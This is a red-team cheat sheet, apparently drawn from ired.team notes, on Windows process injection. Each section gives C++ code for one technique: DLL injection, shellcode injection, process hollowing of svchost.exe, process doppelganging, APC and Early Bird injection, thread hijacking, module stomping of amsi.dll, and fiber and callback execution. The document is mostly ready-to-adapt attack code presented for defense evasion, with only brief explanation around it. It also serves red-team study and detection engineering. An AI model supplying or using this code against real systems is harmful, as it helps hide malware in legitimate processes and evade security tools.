# Code Injection & Process Injection Techniques

## Overview
Process injection allows execution of code within the address space of another process, enabling defense evasion and privilege escalation. Techniques range from classic DLL injection to advanced methods like process hollowing.

*Source: Based on ired.team red team notes*

---

## Classic DLL Injection

### CreateRemoteThread Method
Inject DLL into remote process using standard APIs.

```cpp
// 1. Get target process handle
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// 2. Allocate memory for DLL path
LPVOID dllPath = VirtualAllocEx(hProcess, NULL, strlen(dllName) + 1, MEM_COMMIT, PAGE_READWRITE);

// 3. Write DLL path to target
WriteProcessMemory(hProcess, dllPath, dllName, strlen(dllName) + 1, NULL);

// 4. Get LoadLibraryA address
LPVOID loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// 5. Create remote thread to load DLL
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, dllPath, 0, NULL);
WaitForSingleObject(hThread, INFINITE);
```

### Using NtCreateThreadEx
```cpp
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE hThread, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID lpStartAddress, PVOID lpParameter,
    ULONG Flags, SIZE_T StackZeroBits, SIZE_T SizeOfStackCommit,
    SIZE_T SizeOfStackReserve, PVOID lpBytesBuffer
);

pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, loadLibAddr, dllPath, FALSE, 0, 0, 0, NULL);
```

---

## Shellcode Injection

### Basic Shellcode Injection
```cpp
// 1. Allocate RWX memory in target
LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 2. Write shellcode
WriteProcessMemory(hProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);

// 3. Execute via CreateRemoteThread
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
```

### Using NtWriteVirtualMemory + NtCreateThreadEx
```cpp
NTSTATUS status;

// Allocate
status = NtAllocateVirtualMemory(hProcess, &baseAddr, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write
status = NtWriteVirtualMemory(hProcess, baseAddr, shellcode, shellcodeSize, NULL);

// Execute
status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);
```

---

## Reflective DLL Injection

Load DLL from memory without touching disk.

```cpp
// Reflective loader stub (simplified)
DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // 1. Find base address of DLL in memory
    ULONG_PTR dllBase = (ULONG_PTR)lpParameter;

    // 2. Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBase + dosHeader->e_lfanew);

    // 3. Allocate memory at preferred base (or relocate)
    LPVOID newBase = VirtualAlloc((LPVOID)ntHeaders->OptionalHeader.ImageBase,
                                   ntHeaders->OptionalHeader.SizeOfImage,
                                   MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 4. Copy headers and sections
    // 5. Process relocations
    // 6. Resolve imports
    // 7. Call DllMain

    return 0;
}
```

**Tools:**
- sRDI (Shellcode Reflective DLL Injection)
- ReflectiveDLLInjection (Stephen Fewer)

---

## Process Hollowing

Replace legitimate process with malicious code.

```cpp
// 1. Create suspended process
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Get thread context to find image base
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &ctx);

// 3. Read PEB to get image base
LPVOID imageBase;
ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &imageBase, sizeof(LPVOID), NULL);

// 4. Unmap original image
NtUnmapViewOfSection(pi.hProcess, imageBase);

// 5. Allocate memory at same base
LPVOID newBase = VirtualAllocEx(pi.hProcess, imageBase, malwareSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 6. Write PE headers and sections
WriteProcessMemory(pi.hProcess, newBase, malwareBuffer, malwareSize, NULL);

// 7. Update image base in PEB
WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &newBase, sizeof(LPVOID), NULL);

// 8. Set entry point and resume
ctx.Rcx = (DWORD64)newBase + entryPointRVA;
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## Process Doppelganging

Use NTFS transactions to evade detection.

```cpp
// 1. Create transaction
HANDLE hTransaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);

// 2. Create transacted file
HANDLE hFile = CreateFileTransacted("C:\\Windows\\Temp\\legit.exe", GENERIC_WRITE | GENERIC_READ,
                                     0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL);

// 3. Write malware to transacted file
WriteFile(hFile, malwareBuffer, malwareSize, &bytesWritten, NULL);

// 4. Create section from transacted file
HANDLE hSection;
NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

// 5. Rollback transaction (file disappears)
RollbackTransaction(hTransaction);

// 6. Create process from section
NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), 0, hSection, NULL, NULL, FALSE);

// 7. Create thread to execute
```

---

## APC Injection

### QueueUserAPC
Inject into thread's APC queue (executes when thread enters alertable state).

```cpp
// 1. Allocate and write shellcode
LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);

// 2. Find thread in target process
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);

// 3. Queue APC
QueueUserAPC((PAPCFUNC)shellcodeAddr, hThread, 0);
```

### Early Bird APC Injection
Inject APC before main thread starts (guaranteed execution).

```cpp
// 1. Create suspended process
CreateProcessA(NULL, "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocate and write shellcode
LPVOID addr = VirtualAllocEx(pi.hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, addr, shellcode, shellcodeSize, NULL);

// 3. Queue APC to suspended thread
QueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);

// 4. Resume thread (APC executes immediately)
ResumeThread(pi.hThread);
```

---

## Thread Hijacking

Redirect existing thread execution.

```cpp
// 1. Suspend target thread
HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, threadId);
SuspendThread(hThread);

// 2. Get thread context
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// 3. Allocate and write shellcode
LPVOID shellcodeAddr = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);

// 4. Redirect RIP to shellcode
ctx.Rip = (DWORD64)shellcodeAddr;
SetThreadContext(hThread, &ctx);

// 5. Resume thread
ResumeThread(hThread);
```

---

## SetWindowsHookEx Injection

Inject DLL via Windows hooks.

```cpp
// In injector process
HMODULE hDll = LoadLibraryA("hook.dll");
HOOKPROC hookProc = (HOOKPROC)GetProcAddress(hDll, "HookCallback");

// Set global hook - DLL loads into all GUI processes
HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD, hookProc, hDll, 0);

// Unhook when done
UnhookWindowsHookEx(hHook);
```

---

## Module Stomping

Overwrite legitimate DLL's .text section.

```cpp
// 1. Find loaded module
HMODULE hModule = GetModuleHandle("amsi.dll");

// 2. Get .text section
PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(ntHeaders);

// 3. Make writable
DWORD oldProtect;
VirtualProtect((LPVOID)((BYTE*)hModule + textSection->VirtualAddress), textSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

// 4. Overwrite with shellcode
memcpy((LPVOID)((BYTE*)hModule + textSection->VirtualAddress), shellcode, shellcodeSize);

// 5. Execute
((void(*)())((BYTE*)hModule + textSection->VirtualAddress))();
```

---

## Fiber-Based Execution

Use fibers for shellcode execution.

```cpp
// 1. Convert thread to fiber
LPVOID mainFiber = ConvertThreadToFiber(NULL);

// 2. Allocate shellcode
LPVOID shellcodeAddr = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(shellcodeAddr, shellcode, shellcodeSize);

// 3. Create fiber pointing to shellcode
LPVOID shellcodeFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcodeAddr, NULL);

// 4. Switch to shellcode fiber
SwitchToFiber(shellcodeFiber);

// Shellcode executes, then switches back to main fiber
```

---

## Callback-Based Execution

Execute shellcode via Windows callbacks.

```cpp
// EnumWindows callback
VirtualAlloc + memcpy + EnumWindows((WNDENUMPROC)shellcodeAddr, 0);

// EnumChildWindows
EnumChildWindows(NULL, (WNDENUMPROC)shellcodeAddr, 0);

// EnumDesktops
EnumDesktops(GetProcessWindowStation(), (DESKTOPENUMPROC)shellcodeAddr, 0);

// CreateThreadpoolWait
PTP_WAIT wait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddr, NULL, NULL);
SetThreadpoolWait(wait, event, NULL);
SetEvent(event);
```

---

## Tools Reference

| Tool | Technique |
|------|-----------|
| sRDI | Reflective DLL to shellcode |
| Donut | PE/DLL to shellcode |
| pe_to_shellcode | PE to position-independent code |
| Process Hacker | Process inspection |
| x64dbg | Debugging and analysis |
| Cobalt Strike | Multiple injection methods |
